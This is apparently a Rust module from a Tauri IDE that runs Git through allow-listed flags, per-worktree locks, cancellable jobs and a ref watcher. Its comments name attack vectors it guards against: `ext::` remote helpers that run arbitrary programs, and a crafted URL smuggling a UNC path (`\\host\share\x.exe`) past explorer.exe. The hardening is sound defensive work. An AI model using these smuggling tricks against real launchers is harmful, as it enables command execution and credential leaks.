//! Generic, guarded Git executor with a multi-repository registry.
//!
//! Rust's job is small and declarative: track which repositories are open, and run
//! whatever `git` invocation TypeScript asks for, rejecting anything that could smuggle
//! an unauthorized flag past the intended subcommand. All git *business logic* --
//! argument construction, output parsing, state machines, sequencing -- lives in
//! `src/services/git/` on the TypeScript side. This mirrors how `terminal.rs` keeps PTY
//! mechanics in Rust and leaves everything else to xterm.js.
use ide_workspace::{
    file_tree::clean_path_str,
    process::{capture, capture_within, ToolOutput},
    watcher,
};
use serde::Serialize;
use std::{
    collections::HashMap,
    path::{Path, PathBuf},
    process::Command,
    sync::{
        atomic::{AtomicBool, Ordering},
        Arc, Mutex, MutexGuard, OnceLock, TryLockError,
    },
    time::Duration,
};
use tauri::{AppHandle, Emitter, State};

/// One open repository: its canonical root, its shared-repository identity (see
/// `discover_common_dir`), and a lock serializing Git invocations against this
/// worktree specifically. Each worktree has its own lock, so work in one worktree
/// never blocks another -- unlike the single global lock the previous single-repo
/// design used. `repository_id` is what lets two *different* worktrees of the same
/// repository still coordinate on the state they genuinely share (see `StashLocks`/
/// `NetworkLocks`) without serializing everything else against each other.
pub struct Repo {
    root: PathBuf,
    repository_id: String,
    lock: Mutex<()>,
    /// This worktree's absolute git dir, resolved once (`rev-parse --absolute-git-dir`
    /// never changes for an open worktree) instead of spawning a process per
    /// `repo_state()` call -- one of the six processes every refresh used to launch.
    git_dir: OnceLock<PathBuf>,
}

#[derive(Default)]
pub struct Repos(pub Mutex<HashMap<String, Arc<Repo>>>);

/// Serializes Git's stash-family operations (`push`/`apply`/`pop`/`drop`) across
/// every worktree of one repository, keyed by `repository_id`. `refs/stash` is the
/// one ref with no per-worktree partitioning at all (confirmed empirically -- a
/// stash pushed from one worktree is visible via `stash list` from every other), so
/// unlike almost every other mutation (which Git's own worktree-exclusivity
/// guarantee already keeps collision-free per branch), this genuinely needs
/// cross-worktree coordination. See the Git Operation Engine plan's empirical
/// verification section.
#[derive(Default)]
pub struct StashLocks(pub Mutex<HashMap<String, Arc<Mutex<()>>>>);

/// Serializes `fetch`/`pull`/`push` across every worktree of one repository, keyed by
/// `repository_id` -- remote-tracking refs are likewise not partitioned by worktree.
/// Scoped to the whole repository rather than per-remote: a deliberate simplification
/// (see the plan), not a correctness gap.
#[derive(Default)]
pub struct NetworkLocks(pub Mutex<HashMap<String, Arc<Mutex<()>>>>);

/// One registered, cancellable Git operation: which repository it belongs to (so
/// `git_close_repo` can cancel every job still running against a repository being
/// closed) and the flag `acquire_cancellable`/`capture` poll.
pub(crate) struct JobEntry {
    repo_id: String,
    cancel: Arc<AtomicBool>,
}

/// Every currently in-flight (or not-yet-started) cancellable Git operation, keyed by
/// an id the caller chooses -- mirrors `workbench::Jobs`, the identical pattern
/// already shipped for search cancellation.
#[derive(Default)]
pub struct GitJobs(pub Mutex<HashMap<String, JobEntry>>);

/// A small, purely defensive cap (mirroring `workbench::Jobs`'s own limit) on how many
/// Git operations may be registered at once. Ordinary concurrent-operation counts never
/// approach this.
const MAX_GIT_JOBS: usize = 64;

/// Registers `id` as running against `repo_id` and returns the flag to pass through
/// `exec_on`. The same id registering again reuses its existing flag, so a stale retry
/// never forgets an already-requested cancellation.
fn register_job(jobs: &GitJobs, id: &str, repo_id: &str) -> Result<Arc<AtomicBool>, String> {
    let mut map = jobs.0.lock().map_err(|e| e.to_string())?;
    if !map.contains_key(id) && map.len() >= MAX_GIT_JOBS {
        return Err("Too many Git operations in flight; wait for one to finish".into());
    }
    Ok(map
        .entry(id.to_string())
        .or_insert_with(|| JobEntry {
            repo_id: repo_id.to_string(),
            cancel: Arc::new(AtomicBool::new(false)),
        })
        .cancel
        .clone())
}

/// Cancels every job currently registered against `repo_id` -- used when that
/// repository is closed, so a running operation doesn't keep a `git` process alive
/// against a worktree Yavin no longer considers open.
fn cancel_jobs_for_repo(jobs: &GitJobs, repo_id: &str) -> Result<(), String> {
    let map = jobs.0.lock().map_err(|e| e.to_string())?;
    for entry in map.values().filter(|entry| entry.repo_id == repo_id) {
        entry.cancel.store(true, Ordering::Relaxed);
    }
    Ok(())
}

/// Removes `id`'s entry from `jobs` on drop -- constructed right after
/// `register_job` succeeds, so the entry is removed on every exit path (success,
/// error, or early return) without relying on a manually-placed cleanup call that a
/// future change to `git_exec` could accidentally skip.
struct JobGuard<'a> {
    jobs: &'a GitJobs,
    id: String,
}
impl Drop for JobGuard<'_> {
    fn drop(&mut self) {
        if let Ok(mut map) = self.jobs.0.lock() {
            map.remove(&self.id);
        }
    }
}

/// Finds (or creates) the shared lock for `key` in `map`, without holding `map`'s own
/// mutex any longer than the lookup itself -- the returned `Arc` is what callers
/// actually wait on.
fn lock_for(
    map: &Mutex<HashMap<String, Arc<Mutex<()>>>>,
    key: &str,
) -> Result<Arc<Mutex<()>>, String> {
    Ok(map
        .lock()
        .map_err(|e| e.to_string())?
        .entry(key.to_string())
        .or_insert_with(|| Arc::new(Mutex::new(())))
        .clone())
}

/// Polls for the lock instead of blocking on it, so an operation queued behind
/// another is actually cancellable *before* it ever runs -- the same 20ms cadence
/// `ide_workspace::process::capture` already uses to poll a running process for
/// cancellation, so a cancel request is honored within one tick whether the
/// operation is waiting for a lock or already spawned. A poisoned lock (a previous
/// holder panicked while holding it) is recovered rather than left permanently
/// deadlocked -- safe here because every lock this guards is a plain `Mutex<()>`
/// with no data of its own that a panic could have left inconsistent.
fn acquire_cancellable<'a>(
    lock: &'a Mutex<()>,
    cancel: &AtomicBool,
) -> Result<MutexGuard<'a, ()>, String> {
    let start = std::time::Instant::now();
    loop {
        match lock.try_lock() {
            Ok(guard) => return Ok(guard),
            Err(TryLockError::Poisoned(poisoned)) => return Ok(poisoned.into_inner()),
            Err(TryLockError::WouldBlock) => {}
        }
        if cancel.load(Ordering::Relaxed) {
            return Err("Cancelled".into());
        }
        std::thread::sleep(ide_workspace::process::poll_interval(start.elapsed()));
    }
}

/// Which shared lock (if any) an operation needs beyond its own worktree's lock,
/// decided from the same already-validated subcommand/args `exec_on` has in hand --
/// never supplied by the TypeScript caller. Only the operations empirically confirmed
/// to touch state with no per-worktree partitioning take a `Stash`/`Network` scope;
/// everything else (including commit, branch creation, and every merge-family
/// operation) is `WorktreeLocal`, because Git itself refuses to let two worktrees
/// reference the same branch, so their ref-moving side effects can never collide
/// across worktrees to begin with.
enum Scope {
    /// A pure read: takes no worktree lock (so a refresh's parallel reads really run
    /// in parallel, and a diff/graph/status read is never stuck behind a running
    /// fetch/push/pull) and runs with `GIT_OPTIONAL_LOCKS=0` so it can never take
    /// `index.lock` from a concurrent mutation. Deliberately narrow: only argv shapes
    /// that cannot write anything, decided here -- anything not listed is not a read.
    Read,
    WorktreeLocal,
    Stash,
    Network,
}

fn operation_scope(subcommand: &str, rest: &[String]) -> Scope {
    match subcommand {
        "stash" => match rest.first().map(String::as_str) {
            Some("push") | Some("apply") | Some("pop") | Some("drop") | Some("clear") => {
                Scope::Stash
            }
            Some("list") | Some("show") => Scope::Read,
            _ => Scope::WorktreeLocal,
        },
        "status" | "log" | "show" | "diff" | "for-each-ref" | "rev-parse" | "cat-file"
        | "check-ref-format" => Scope::Read,
        // `git remote <verb> ...` can add/remove/rename; only the bare listing is a read.
        "remote" if rest.is_empty() || rest.first().map(String::as_str) == Some("get-url") => {
            Scope::Read
        }
        "worktree" if rest.first().map(String::as_str) == Some("list") => Scope::Read,
        "fetch" | "pull" | "push" => Scope::Network,
        _ => Scope::WorktreeLocal,
    }
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
pub struct RepoInfo {
    pub repo_id: String,
    pub root: String,
}

fn repo_of(state: &Repos, repo_id: &str) -> Result<Arc<Repo>, String> {
    state
        .0
        .lock()
        .map_err(|e| e.to_string())?
        .get(repo_id)
        .cloned()
        .ok_or_else(|| "This repository is no longer open. Reopen it and try again.".to_string())
}

/// Runs `git` with the hardening this app has always applied: no pager, no shell,
/// literal pathspecs, no interactive credential/editor prompts, and the same 16 MB
/// output cap the previous single-repo design enforced.
fn run(root: &Path, args: &[&str]) -> Result<ToolOutput, String> {
    run_command(root, args, None, Arc::new(AtomicBool::new(false)), false)
}

/// `run` with a longer deadline than the shared default, for `clone` -- the one Git command
/// here whose legitimate running time is measured in minutes rather than milliseconds.
fn run_within(root: &Path, args: &[&str], timeout: Duration) -> Result<ToolOutput, String> {
    let mut command = Command::new("git");
    command
        .current_dir(root)
        .args(["--no-pager", "--literal-pathspecs"])
        .args(args)
        .env("GIT_TERMINAL_PROMPT", "0")
        .env("GIT_EDITOR", "true")
        .env("LC_ALL", "C")
        .env("LANGUAGE", "C");
    let result = capture_within(command, None, Arc::new(AtomicBool::new(false)), timeout)?;
    if result.truncated {
        return Err("Git output exceeded 16 MB; narrow the operation".into());
    }
    Ok(result)
}

/// Like `run`, but pipes `input` to Git's stdin -- the only current use is feeding a
/// patch to `git apply` for hunk-level staging/unstaging/discarding -- and accepts a
/// real cancellation flag for use by `exec_on`, where an operation is actually
/// cancellable; internal bookkeeping calls (toplevel/common-dir discovery, repo
/// state) go through `run` above with a flag that's never set, since those aren't
/// user-cancellable operations. The patch is data Git parses, not a command or shell
/// input, so it needs no extra validation beyond the argv allow-list `apply` (like
/// every subcommand) already goes through.
fn run_command(
    root: &Path,
    args: &[&str],
    input: Option<String>,
    cancel: Arc<AtomicBool>,
    read_only: bool,
) -> Result<ToolOutput, String> {
    let mut command = Command::new("git");
    command
        .current_dir(root)
        .args(["--no-pager", "--literal-pathspecs"])
        .args(args)
        .env("GIT_TERMINAL_PROMPT", "0")
        .env("GIT_EDITOR", "true")
        // Pin Git's own diagnostic text to English, independent of the user's OS
        // locale: `discover_toplevel` below and TypeScript's `describeGitError` both
        // match specific English phrases in stderr, which a localized Git would never
        // produce, silently defeating both matchers.
        .env("LC_ALL", "C")
        .env("LANGUAGE", "C");
    if read_only {
        command.env("GIT_OPTIONAL_LOCKS", "0");
    }
    let result = capture(command, input, cancel)?;
    if result.truncated {
        return Err("Git output exceeded 16 MB; narrow the operation".into());
    }
    Ok(result)
}

/// Resolves any path inside a repository to that repository's true, canonical
/// top-level -- so a repo opened from a nested subfolder is always tracked and
/// operated on by its real root, never a partial view of it.
fn discover_toplevel(path: &Path) -> Result<PathBuf, String> {
    if !path.is_dir() {
        return Err("Not a directory".into());
    }
    let canonical = path
        .canonicalize()
        .map_err(|e| format!("Invalid path: {e}"))?;
    let discover = run(&canonical, &["rev-parse", "--show-toplevel"])?;
    if discover.code != 0 {
        return Err(if discover.stderr.contains("not a git repository") {
            "This folder is not a Git repository.".to_string()
        } else {
            discover.stderr.trim().to_string()
        });
    }
    PathBuf::from(discover.stdout.trim())
        .canonicalize()
        .map_err(|e| e.to_string())
}

/// Resolves any path inside a repository -- main worktree or linked worktree alike --
/// to that repository's *shared* Git directory (`--git-common-dir`). Unlike
/// `discover_toplevel`, which returns a different, worktree-specific root for each
/// linked worktree, this value is identical from every worktree of the same
/// repository, which is what makes it the correct key for `StashLocks`/
/// `NetworkLocks`: a linked worktree must never be mistaken for an independent
/// repository when deciding whether two operations share a lock.
fn discover_common_dir(path: &Path) -> Result<PathBuf, String> {
    if !path.is_dir() {
        return Err("Not a directory".into());
    }
    let canonical = path
        .canonicalize()
        .map_err(|e| format!("Invalid path: {e}"))?;
    let discover = run(&canonical, &["rev-parse", "--git-common-dir"])?;
    if discover.code != 0 {
        return Err(if discover.stderr.contains("not a git repository") {
            "This folder is not a Git repository.".to_string()
        } else {
            discover.stderr.trim().to_string()
        });
    }
    let reported = PathBuf::from(discover.stdout.trim());
    // Git reports a path relative to the queried directory when the common dir lies
    // under it (the common case); resolve against that directory, not the process's
    // own working directory, before canonicalizing.
    let absolute = if reported.is_absolute() {
        reported
    } else {
        canonical.join(reported)
    };
    absolute.canonicalize().map_err(|e| e.to_string())
}

/// Registers (or reuses) a repository whose top-level has already been resolved.
fn register_repo(repos: &Repos, toplevel: PathBuf) -> Result<RepoInfo, String> {
    let repo_id = clean_path_str(&toplevel);
    let mut guard = repos.0.lock().map_err(|e| e.to_string())?;
    if let std::collections::hash_map::Entry::Vacant(entry) = guard.entry(repo_id.clone()) {
        // Best-effort: fall back to this worktree's own root as its own repository
        // identity if the common-dir lookup somehow fails. That only means this
        // worktree's stash/network operations won't be coordinated with any sibling
        // worktree of the same repository -- every other guarantee in this file
        // (the security allow-list, this worktree's own lock) is unaffected.
        let repository_id = discover_common_dir(&toplevel)
            .map(|p| clean_path_str(&p))
            .unwrap_or_else(|_| repo_id.clone());
        entry.insert(Arc::new(Repo {
            root: toplevel.clone(),
            repository_id,
            lock: Mutex::new(()),
            git_dir: OnceLock::new(),
        }));
    }
    drop(guard);
    Ok(RepoInfo {
        repo_id,
        root: clean_path_str(&toplevel),
    })
}

#[tauri::command]
pub async fn git_open_repo(state: State<'_, Repos>, path: String) -> Result<RepoInfo, String> {
    let candidate = PathBuf::from(path);
    let toplevel = tauri::async_runtime::spawn_blocking(move || discover_toplevel(&candidate))
        .await
        .map_err(|e| e.to_string())??;
    register_repo(&state, toplevel)
}

/// Turns an existing folder into a Git repository (`git init`), for the "this folder is not a
/// repository" page. Refuses a folder that is already inside a repository: initialising there
/// would silently create a nested repository that shadows the real one.
fn init_repository(path: &Path) -> Result<PathBuf, String> {
    if !path.is_dir() {
        return Err("Not a directory".into());
    }
    let canonical = path
        .canonicalize()
        .map_err(|e| format!("Invalid path: {e}"))?;
    if discover_toplevel(&canonical).is_ok() {
        return Err("This folder is already inside a Git repository.".into());
    }
    let init = run(&canonical, &["init"])?;
    if init.code != 0 {
        return Err(init.stderr.trim().to_string());
    }
    discover_toplevel(&canonical)
}

/// Clones `url` into a new folder named `folder` inside `parent`, returning the new work
/// tree's root so the caller can open it like any other repository.
///
/// Separate from `git_exec` because there is no repository to run inside yet -- this is the
/// one Git command the app runs against a plain directory. The URL goes through the same
/// `is_safe_remote_url` gate as `remote add`: a clone URL reaches Git's transport layer in
/// exactly the same way, so `ext::` here would be arbitrary command execution too, and this
/// one runs the helper immediately rather than on some later fetch.
fn clone_repository(parent: &Path, url: &str, folder: &str) -> Result<PathBuf, String> {
    if !is_safe_remote_url(url) {
        return Err(
            "That clone URL is not an accepted transport -- a remote helper such as `ext::` \
             runs an arbitrary program."
                .into(),
        );
    }
    // The folder is a single new name inside `parent`, never a path: a separator would let a
    // clone land outside the folder the user picked, and a leading `-` would be read as an
    // option by `git clone` itself.
    if folder.is_empty()
        || folder.starts_with('-')
        || folder.contains('/')
        || folder.contains('\\')
        || folder == "."
        || folder == ".."
        || folder.chars().any(char::is_control)
    {
        return Err("Enter a plain folder name for the clone.".into());
    }
    if !parent.is_dir() {
        return Err("Not a directory".into());
    }
    let canonical = parent
        .canonicalize()
        .map_err(|e| format!("Invalid path: {e}"))?;
    let destination = canonical.join(folder);
    if destination.exists() {
        return Err(format!("\"{folder}\" already exists in that folder."));
    }
    // `--` keeps a URL that begins with a dash from being read as an option, belt and braces
    // alongside the `is_safe_remote_url` check above.
    let cloned = run_within(
        &canonical,
        &["clone", "--", url, folder],
        Duration::from_secs(30 * 60),
    )?;
    if cloned.code != 0 {
        return Err(cloned.stderr.trim().to_string());
    }
    discover_toplevel(&destination)
}

#[tauri::command]
pub async fn git_clone_repo(
    state: State<'_, Repos>,
    parent: String,
    url: String,
    folder: String,
) -> Result<RepoInfo, String> {
    let parent = PathBuf::from(parent);
    let toplevel =
        tauri::async_runtime::spawn_blocking(move || clone_repository(&parent, &url, &folder))
            .await
            .map_err(|e| e.to_string())??;
    register_repo(&state, toplevel)
}

#[tauri::command]
pub async fn git_init_repo(state: State<'_, Repos>, path: String) -> Result<RepoInfo, String> {
    let candidate = PathBuf::from(path);
    let toplevel = tauri::async_runtime::spawn_blocking(move || init_repository(&candidate))
        .await
        .map_err(|e| e.to_string())??;
    register_repo(&state, toplevel)
}

#[tauri::command]
pub fn git_close_repo(
    state: State<'_, Repos>,
    jobs: State<'_, GitJobs>,
    repo_id: String,
) -> Result<(), String> {
    state.0.lock().map_err(|e| e.to_string())?.remove(&repo_id);
    // A running (or lock-queued) operation against this worktree should not keep a
    // `git` process alive once Yavin no longer considers the repository open.
    cancel_jobs_for_repo(&jobs, &repo_id)?;
    Ok(())
}

/// Every currently-active per-repository `.git` watcher (see
/// `ide_workspace::watcher::start_git_watcher`), keyed by `repository_id` --
/// mirrors `Repos`'s own shape. Registering a repository that's already watched
/// replaces its entry (dropping, and so stopping, the old watcher first): this is
/// how opening a second worktree of an already-watched repository re-registers
/// with the expanded worktree list, without TypeScript needing to track "is this
/// the first worktree" specially.
#[derive(Default)]
pub struct GitWatches(pub Mutex<HashMap<String, watcher::RecommendedWatcher>>);

/// The payload `git-changed` carries -- a bare classification, no Git data of its
/// own (TypeScript decides what to actually refresh; see the Git State &
/// Synchronization plan's Section Z). `worktree_root` is only present for the two
/// per-worktree kinds (`head`, `operation-state`); the three repository-shared
/// kinds (`refs`, `remotes`, `stash`) apply to every worktree of the repository.
#[derive(Serialize, Clone, Debug, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
struct GitChangeEvent {
    repository_id: String,
    kind: &'static str,
    worktree_root: Option<String>,
}

/// Resolves each worktree's real, absolute gitdir via `rev-parse
/// --absolute-git-dir` (needed so a `Head`/`OperationState` event, which
/// `start_git_watcher` reports by gitdir, can be translated back to the worktree
/// root TypeScript actually keys its `RepoEntry`s by). A worktree that fails to
/// resolve (e.g. it was removed externally between being tracked and this call)
/// is silently skipped, not fatal to the rest. Split out from `watch_repo` because
/// `run()` spawns a blocking `git` process and must run off the async runtime's
/// worker thread, exactly like every other git-invoking command in this file.
fn resolve_worktree_gitdirs(roots: Vec<(PathBuf, String)>) -> Vec<(PathBuf, String)> {
    roots
        .into_iter()
        .filter_map(|(root, repo_id)| {
            let output = run(&root, &["rev-parse", "--absolute-git-dir"]).ok()?;
            (output.code == 0).then(|| (PathBuf::from(output.stdout.trim()), repo_id))
        })
        .collect()
}

/// Starts (or restarts, if already watching) a narrow `.git`-ref watcher for one
/// repository, covering exactly the worktrees named by `worktree_repo_ids`. The
/// full logic behind the `git_watch_repo` command, taking `&Repos`/`&GitWatches`
/// directly and a plain event callback instead of `State`/`AppHandle::emit` --
/// mirrors how `exec_on` relates to `git_exec` (Module 2 Phase 5), so this can be
/// exercised by a real test with real repositories and no Tauri app needed.
async fn watch_repo(
    repos: &Repos,
    watches: &GitWatches,
    on_event: impl Fn(GitChangeEvent) + Send + Sync + 'static,
    repository_id: String,
    worktree_repo_ids: Vec<String>,
) -> Result<(), String> {
    let roots: Vec<(PathBuf, String)> = worktree_repo_ids
        .iter()
        .filter_map(|id| repo_of(repos, id).ok())
        .map(|repo| (repo.root.clone(), clean_path_str(&repo.root)))
        .collect();

    let gitdirs = tauri::async_runtime::spawn_blocking(move || resolve_worktree_gitdirs(roots))
        .await
        .map_err(|e| e.to_string())?;

    let common_dir = PathBuf::from(&repository_id);
    let worktree_gitdirs: Vec<PathBuf> = gitdirs.iter().map(|(dir, _)| dir.clone()).collect();
    let gitdir_to_root: HashMap<PathBuf, String> = gitdirs.into_iter().collect();

    let event_repository_id = repository_id.clone();
    let watcher = watcher::start_git_watcher(&common_dir, &worktree_gitdirs, move |kind| {
        let (kind_name, worktree_root): (&'static str, Option<String>) = match &kind {
            watcher::GitChangeKind::Head(dir) => ("head", gitdir_to_root.get(dir).cloned()),
            watcher::GitChangeKind::OperationState(dir) => {
                ("operation-state", gitdir_to_root.get(dir).cloned())
            }
            watcher::GitChangeKind::Refs => ("refs", None),
            watcher::GitChangeKind::Remotes => ("remotes", None),
            watcher::GitChangeKind::Stash => ("stash", None),
        };
        on_event(GitChangeEvent {
            repository_id: event_repository_id.clone(),
            kind: kind_name,
            worktree_root,
        });
    })
    .map_err(|e| e.to_string())?;

    watches
        .0
        .lock()
        .map_err(|e| e.to_string())?
        .insert(repository_id, watcher);
    Ok(())
}

#[tauri::command]
pub async fn git_watch_repo(
    app: AppHandle,
    state: State<'_, Repos>,
    watches: State<'_, GitWatches>,
    repository_id: String,
    worktree_repo_ids: Vec<String>,
) -> Result<(), String> {
    let handle = app.clone();
    watch_repo(
        &state,
        &watches,
        move |event| {
            let _ = handle.emit("git-changed", event);
        },
        repository_id,
        worktree_repo_ids,
    )
    .await
}

/// Stops watching one repository -- dropping its `RecommendedWatcher` ends the
/// watch immediately. Called once the last worktree of a repository is closed;
/// closing one of several open worktrees instead calls `git_watch_repo` again
/// with the remaining, narrower worktree list.
#[tauri::command]
pub fn git_unwatch_repo(
    watches: State<'_, GitWatches>,
    repository_id: String,
) -> Result<(), String> {
    watches
        .0
        .lock()
        .map_err(|e| e.to_string())?
        .remove(&repository_id);
    Ok(())
}

/// The interrupted operation the repository is sitting in, or "" when it is idle.
fn git_dir_of(repo: &Repo) -> Result<PathBuf, String> {
    if let Some(dir) = repo.git_dir.get() {
        return Ok(dir.clone());
    }
    let output = run(&repo.root, &["rev-parse", "--absolute-git-dir"])?;
    if output.code != 0 {
        return Err(output.stderr.trim().to_string());
    }
    let dir = PathBuf::from(output.stdout.trim());
    let _ = repo.git_dir.set(dir.clone());
    Ok(dir)
}

fn repo_state(repo: &Repo) -> Result<String, String> {
    let dir = git_dir_of(repo)?;
    let has = |name: &str| dir.join(name).exists();
    Ok(if has("rebase-merge") || has("rebase-apply") {
        "rebase"
    } else if has("MERGE_HEAD") {
        "merge"
    } else if has("CHERRY_PICK_HEAD") {
        "cherry-pick"
    } else if has("REVERT_HEAD") {
        "revert"
    } else {
        ""
    }
    .to_string())
}

/// Whether an open worktree's folder can still be used as one:
/// - `missing`: the folder no longer exists (deleted, moved, or its drive is gone);
/// - `invalid`: it exists but Git no longer treats it as this work tree (its `.git` was
///   removed, or a different repository now lives there);
/// - `ready`: otherwise.
///
/// Cheap by design (one directory check, and one `rev-parse` only when the folder exists), so
/// the UI can call it whenever a refresh fails to tell "Git said no" from "the folder is gone".
fn probe_worktree(root: &Path) -> &'static str {
    if !root.is_dir() {
        return "missing";
    }
    let same_root = |reported: &str| match (
        PathBuf::from(reported.trim()).canonicalize(),
        root.canonicalize(),
    ) {
        (Ok(a), Ok(b)) => a == b,
        _ => false,
    };
    match run(root, &["rev-parse", "--show-toplevel"]) {
        Ok(output) if output.code == 0 && same_root(&output.stdout) => "ready",
        _ => "invalid",
    }
}

#[tauri::command]
pub async fn git_probe_worktree(
    state: State<'_, Repos>,
    repo_id: String,
) -> Result<String, String> {
    let repo = repo_of(&state, &repo_id)?;
    tauri::async_runtime::spawn_blocking(move || probe_worktree(&repo.root).to_string())
        .await
        .map_err(|e| e.to_string())
}

/// Opens `url` in the OS's default browser -- "Open on GitHub"/"Open on GitLab"/etc, once a
/// remote URL has already been converted to its web form on the TypeScript side. Restricted to
/// `https://`: the only schemes a converted remote URL is ever produced as, and narrow enough
/// that this can never be turned into a way to launch an arbitrary local program or file.
#[tauri::command]
pub async fn git_open_external_url(url: String) -> Result<(), String> {
    if !is_openable_web_url(&url) {
        return Err("Only a plain https:// URL may be opened".into());
    }
    tauri::async_runtime::spawn_blocking(move || open_external_url(&url))
        .await
        .map_err(|e| e.to_string())?
}

/// The URL reaching `open_external_url` is derived from `git remote get-url`, i.e. from
/// repository content, so "it starts with https://" is not on its own enough. The launchers
/// below are not shells, but `explorer.exe` in particular does not follow the usual argument
/// quoting and has historically split its argument on commas -- which would let one crafted
/// remote URL open a *second* target such as a UNC path (`\\host\share\x.exe`, an NTLM leak
/// or a program launch). Whitespace, quotes, backslashes and commas have no business in a
/// converted web URL, so all of them are refused rather than escaped.
fn is_openable_web_url(url: &str) -> bool {
    const MAX_URL: usize = 2048;
    let Some(rest) = url.strip_prefix("https://") else {
        return false;
    };
    if url.len() > MAX_URL || rest.is_empty() {
        return false;
    }
    if url
        .chars()
        .any(|c| c.is_control() || c.is_whitespace() || matches!(c, '\\' | ',' | '"' | '\'' | '|'))
    {
        return false;
    }
    let host = rest.split(['/', '?', '#']).next().unwrap_or("");
    let host = host.rsplit('@').next().unwrap_or("");
    !host.is_empty() && !host.starts_with('-')
}

fn open_external_url(url: &str) -> Result<(), String> {
    #[cfg(target_os = "windows")]
    {
        // `explorer` treats an http(s) argument as "open this URL in the default browser" --
        // the same mechanism `reveal_in_os_explorer` already relies on for opening a path.
        Command::new("explorer")
            .arg(url)
            .spawn()
            .map_err(|e| e.to_string())?;
        Ok(())
    }
    #[cfg(target_os = "macos")]
    {
        Command::new("open")
            .arg(url)
            .spawn()
            .map_err(|e| e.to_string())?;
        Ok(())
    }
    #[cfg(target_os = "linux")]
    {
        Command::new("xdg-open")
            .arg(url)
            .spawn()
            .map_err(|e| e.to_string())?;
        Ok(())
    }
}

#[tauri::command]
pub async fn git_repo_state(state: State<'_, Repos>, repo_id: String) -> Result<String, String> {
    let repo = repo_of(&state, &repo_id)?;
    tauri::async_runtime::spawn_blocking(move || repo_state(&repo))
        .await
        .map_err(|e| e.to_string())?
}

/// One flag a subcommand is allowed to receive before a literal `--`. `prefix` matches
/// e.g. `--porcelain=` against `--porcelain=v2`; `takes_value` means the *next* argv
/// token is this flag's opaque value (a commit message, a branch name...) and is never
/// itself checked -- exactly like Git's own option parser treats `-m <value>`.
struct FlagRule {
    name: &'static str,
    prefix: bool,
    takes_value: bool,
}
const fn flag(name: &'static str) -> FlagRule {
    FlagRule {
        name,
        prefix: false,
        takes_value: false,
    }
}
const fn value_flag(name: &'static str) -> FlagRule {
    FlagRule {
        name,
        prefix: false,
        takes_value: true,
    }
}
const fn prefix_flag(name: &'static str) -> FlagRule {
    FlagRule {
        name,
        prefix: true,
        takes_value: false,
    }
}

// One `const` array per subcommand: `const` initializers are fully evaluated at
// compile time regardless of Rust's (narrower) rvalue-static-promotion rules, so the
// helper functions above can be used freely here.
const STATUS: &[FlagRule] = &[
    prefix_flag("--porcelain="),
    flag("--branch"),
    flag("-z"),
    flag("-uall"),
    flag("--untracked-files=no"),
];
const REV_PARSE: &[FlagRule] = &[
    flag("--show-toplevel"),
    flag("--verify"),
    flag("--absolute-git-dir"),
    flag("--git-common-dir"),
    flag("--is-shallow-repository"),
];
const CAT_FILE: &[FlagRule] = &[flag("--filters")];
const DIFF: &[FlagRule] = &[
    flag("--no-ext-diff"),
    flag("--no-textconv"),
    flag("--no-color"),
    flag("--cached"),
    flag("--name-only"),
    flag("-M"),
    prefix_flag("--diff-filter="),
];
const NONE: &[FlagRule] = &[];
const RESTORE: &[FlagRule] = &[flag("--staged")];
const RM: &[FlagRule] = &[flag("--cached")];
// `-a` (stage every tracked change first), `--amend` (replace HEAD instead of adding a new
// commit) and `-s` (append a Signed-off-by trailer) are Git's own ordinary commit modes --
// none of them can rewrite anything other than the working commit itself.
const COMMIT: &[FlagRule] = &[value_flag("-m"), flag("-a"), flag("--amend"), flag("-s")];
// A soft reset only moves HEAD (and the branch it points to) back one commit, leaving the
// index and working tree untouched -- nothing is deleted, and `validate_shape` below pins the
// target to exactly `HEAD~1`, so this can only ever undo the single most recent commit.
const RESET: &[FlagRule] = &[flag("--soft")];
const SWITCH: &[FlagRule] = &[value_flag("-c")];
const PULL: &[FlagRule] = &[
    flag("--ff-only"),
    flag("--rebase"),
    flag("--no-autostash"),
    flag("--no-rebase"),
    flag("--no-edit"),
];
// `--delete` and `--tags` are added for "Delete Remote Branch/Tag…" and "Push Tags"; neither
// takes a refspec of its own (see `validate_shape`'s two-positional arm below), so the
// no-force-push guarantee this file's other comments describe is unaffected.
const PUSH: &[FlagRule] = &[flag("--set-upstream"), flag("--delete"), flag("--tags")];
const SHOW: &[FlagRule] = &[
    flag("--stat"),
    flag("--oneline"),
    prefix_flag("--pretty="),
    flag("--numstat"),
    // NUL-terminated records so paths need no unquoting (see `parseCommitDetails`).
    flag("-z"),
    // Added for Repository.commitFileDiff() -- a single historical commit's diff for
    // one file, matching the exact flag set `diff()` already uses for a working-tree/
    // index comparison (Module 9).
    flag("--no-ext-diff"),
    flag("--no-textconv"),
    flag("--no-color"),
    flag("-M"),
];
const STASH: &[FlagRule] = &[
    flag("-u"),
    flag("--staged"),
    flag("-p"),
    flag("--no-color"),
    value_flag("-m"),
];
const TAG: &[FlagRule] = &[flag("-l"), flag("-d")];
// The patch content itself travels over stdin, not argv -- see `git_exec`'s `input`.
const APPLY: &[FlagRule] = &[flag("--cached"), flag("-R")];
// The branch name being validated is the whole point of this call, so it must pass
// through untouched (even if it starts with '-') for Git's own check to accept/reject.
const CHECK_REF_FORMAT: &[FlagRule] = &[value_flag("--branch")];
const SYMBOLIC_REF: &[FlagRule] = &[flag("--short")];
// `--skip` is meaningless for `merge` (Git has no multi-commit sequence for it to
// advance past) -- allowing it here is still safe, since `merge --skip` simply fails
// with Git's own argument error; `Repository.skip()` never issues it for merge in the
// first place (a client-side guard, since Git's own error text here is generic, not
// semantically clear the way its worktree-exclusivity/unresolved-conflict refusals are).
const ABORT_CONTINUE: &[FlagRule] = &[flag("--abort"), flag("--continue"), flag("--skip")];
// `--all` (every ref, for the graph's "All" scope) and a single trailing branch name
// (its "pick a branch" scope) are the only two ways `graphLog`'s ref scope can widen
// past the implicit HEAD-only default; `validate_shape` pins the exact shape.
const LOG: &[FlagRule] = &[
    value_flag("-n"),
    value_flag("--skip"),
    flag("--topo-order"),
    flag("--all"),
    prefix_flag("--pretty="),
    prefix_flag("--date="),
];
const FOR_EACH_REF: &[FlagRule] = &[prefix_flag("--format=")];
// Like `stash` (`push`/`pop`/`apply`/`drop`/`list` are positional, not flags, so this
// allow-list only governs `--porcelain`), TypeScript currently only ever calls
// `worktree list --porcelain`; nothing constructs `worktree add/remove/lock/prune`
// yet, so there is nothing else to validate here today.
const WORKTREE: &[FlagRule] = &[flag("--porcelain"), flag("-z")];
